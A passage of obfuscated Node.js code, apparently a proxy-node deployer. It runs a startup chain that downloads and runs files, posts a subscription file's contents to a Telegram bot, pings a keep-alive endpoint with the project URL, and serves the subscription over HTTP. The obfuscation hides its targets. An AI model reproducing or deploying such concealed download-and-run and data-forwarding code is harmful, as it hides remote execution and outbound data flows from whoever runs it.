    return
  }
  try {
    const _0x5c0dbf = fs['readFileSync'](subPath, 'utf8'),
      _0x26e5ee = _0x51013a(_0x14d49c._0x207c67) + BOT_TOKEN + _0x51013a(0x1ab),
      _0x52b114 = NAME[_0x51013a(0xe8)](/[_*\[\]()~`>#+=|{}.!-]/g, _0x51013a(0x134)),
      _0x6714fb = { chat_id: CHAT_ID, text: '**' + _0x52b114 + _0x51013a(0x151) + _0x5c0dbf + '```', parse_mode: _0x51013a(0x128) }
    ;(await axios[_0x51013a(0x1d2)](_0x26e5ee, null, { params: _0x6714fb }), console['log'](_0x51013a(_0x14d49c._0x4cbde7)))
  } catch (_0x5f15dc) {
    console['error'](_0x51013a(_0x14d49c._0x40c105), _0x5f15dc[_0x51013a(0x161)])
  }
}
async function AddVisitTask() {
  const _0x4ca7e1 = { _0x514503: 0x1b5, _0x3977c4: 0x188, _0x2f7256: 0xf2 },
    _0x5213e5 = _0xfeddc6
  if (!AUTO_ACCESS || !PROJECT_URL) {
    console[_0x5213e5(0x188)](_0x5213e5(_0x4ca7e1._0x514503))
    return
  }
  try {
    const _0x212140 = await axios['post'](_0x5213e5(0x121), { url: PROJECT_URL }, { headers: { 'Content-Type': 'application/json' } })
    return (console[_0x5213e5(_0x4ca7e1._0x3977c4)](_0x5213e5(_0x4ca7e1._0x2f7256)), _0x212140)
  } catch (_0x1f45cf) {
    return (console[_0x5213e5(0x15c)](_0x5213e5(0x117) + _0x1f45cf['message']), null)
  }
}
async function startserver() {
  const _0x47e9ec = { _0x335c3d: 0x15c, _0x2c0dad: 0x12f },
    _0x1a0f63 = _0xfeddc6
  try {
    ;(argoType(),
      deleteNodes(),
      cleanupOldFiles(),
      isValidPort(REALITY_PORT) && generateOrLoadKeyPair(),
      isValidPort(HY2_PORT) && ensureTlsCertificates(certPath, keyPath),
      await generateConfig(),
      await downloadFilesAndRun(),
      await extractDomains(),
      await sendTelegram(),
      await AddVisitTask())
  } catch (_0x13bf44) {
    console[_0x1a0f63(_0x47e9ec._0x335c3d)](_0x1a0f63(_0x47e9ec._0x2c0dad), _0x13bf44)
  }
}
startserver()['catch']((_0x1c4727) => {
  const _0x1753ce = { _0x293c54: 0x15c },
    _0x592320 = _0xfeddc6
  console[_0x592320(_0x1753ce._0x293c54)]('Unhandled\x20error\x20in\x20startserver:', _0x1c4727)
})
const server = http[_0xfeddc6(0x1c8)](async (_0x14d160, _0xc0c968) => {
  const _0x5cddae = {
      _0x543ed7: 0x1d7,
      _0x2c731a: 0x1c7,
      _0x1a8361: 0x1ce,
      _0x53690b: 0x1c5,
      _0x35a86e: 0x11c,
      _0x2b96f3: 0xd4,
      _0x5752e7: 0xb7,
      _0x1a3729: 0x137,
      _0xfe19c: 0x1d0,
      _0x58344a: 0x155
    },
    _0x80c090 = _0xfeddc6,
    _0x10132d = _0x14d160['url']['split']('?')[0x0]
  if (_0x10132d === '/' + SUB_PATH) {
    if (subContent) (_0xc0c968['writeHead'](0xc8, { 'Content-Type': _0x80c090(0x155) }), _0xc0c968['end'](subContent))
    else
      try {
        const _0x205d28 = fs[_0x80c090(0x166)](subPath, _0x80c090(0x12a))
        ;(_0xc0c968[_0x80c090(_0x5cddae._0x543ed7)](0xc8, { 'Content-Type': 'text/plain;\x20charset=utf-8' }), _0xc0c968['end'](_0x205d28))
      } catch (_0x4376bd) {
        ;(_0xc0c968[_0x80c090(0x1d7)](0x1f7, { 'Content-Type': _0x80c090(0x155) }), _0xc0c968[_0x80c090(0x137)](_0x80c090(_0x5cddae._0x2c731a)))
      }
    return
  }
  if (_0x10132d === '/') {
    try {
      const _0x5a0fdc = path[_0x80c090(_0x5cddae._0x1a8361)](__dirname, _0x80c090(_0x5cddae._0x53690b)),
        _0x146c4d = await fs[_0x80c090(_0x5cddae._0x35a86e)][_0x80c090(_0x5cddae._0x2b96f3)](_0x5a0fdc, 'utf8')
      ;(_0xc0c968[_0x80c090(0x1d7)](0xc8, { 'Content-Type': 'text/html;\x20charset=utf-8' }), _0xc0c968[_0x80c090(0x137)](_0x146c4d))
    } catch (_0x2291fc) {
      ;(_0xc0c968['writeHead'](0xc8, { 'Content-Type': _0x80c090(_0x5cddae._0x5752e7) }),
        _0xc0c968[_0x80c090(_0x5cddae._0x1a3729)](_0x80c090(_0x5cddae._0xfe19c)))
    }
    return
  }
  ;(_0xc0c968[_0x80c090(0x1d7)](0x194, { 'Content-Type': _0x80c090(_0x5cddae._0x58344a) }), _0xc0c968['end']('Not\x20Found'))
})
server['listen'](PORT, () => alwaysLog(_0xfeddc6(0x1db) + PORT + '!'))
